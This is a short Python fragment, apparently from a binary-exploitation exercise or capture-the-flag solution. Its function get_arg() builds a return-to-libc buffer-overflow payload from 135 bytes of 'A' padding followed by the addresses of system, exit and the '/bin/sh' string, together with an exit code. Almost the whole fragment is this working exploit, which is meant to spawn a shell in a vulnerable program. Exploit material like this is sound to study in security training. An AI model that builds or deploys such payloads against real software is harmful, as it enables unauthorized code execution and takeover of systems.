...
def get_arg() -> bytes:
    ...
    """
    return ('A'*135).encode('utf-8') + addresses.address_to_bytes(addresses.SYSTEM) + addresses.address_to_bytes(addresses.EXIT) + addresses.address_to_bytes(addresses.LIBC_BIN_SH) + struct.pack('B', EXIT_CODE)
